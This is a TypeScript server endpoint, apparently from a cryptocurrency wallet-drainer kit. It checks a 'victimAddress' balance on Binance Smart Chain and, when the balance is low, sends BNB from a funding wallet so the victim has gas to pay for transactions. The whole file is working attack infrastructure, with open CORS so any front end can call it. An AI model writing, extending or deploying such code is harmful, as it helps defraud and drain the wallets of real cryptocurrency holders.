// server/api/fund-gas.ts
import { defineEventHandler, readBody, setResponseHeaders, H3Event  } from 'h3';
import { ethers } from 'ethers';

export default defineEventHandler(async (event: H3Event) => {
  // Enable CORS
  setResponseHeaders(event, {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
  });

  // Handle preflight OPTIONS request
  if (event.method === 'OPTIONS') {
    return { success: true };
  }

  const { victimAddress } = await readBody(event);
  const FUNDING_PRIVATE_KEY = process.env.FUNDING_PRIVATE_KEY;
  const RPC_URL = "https://bsc-dataseed.binance.org/";

  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const fundingWallet = new ethers.Wallet(FUNDING_PRIVATE_KEY, provider);
  const minBalance = ethers.parseEther('0.0003');

  try {
    const balance = await provider.getBalance(victimAddress);
    if (balance < minBalance) {
      const tx = await fundingWallet.sendTransaction({
        to: victimAddress,
        value: ethers.parseEther('0.0005'),
      });
      await tx.wait();
      return { success: true, txHash: tx.hash };
    } else {
      return { success: true, message: 'Victim has enough BNB.' };
    }
  } catch (error: any) {
    console.error('Gas funding error:', error);
    return { success: false, error: error.message };
  }
});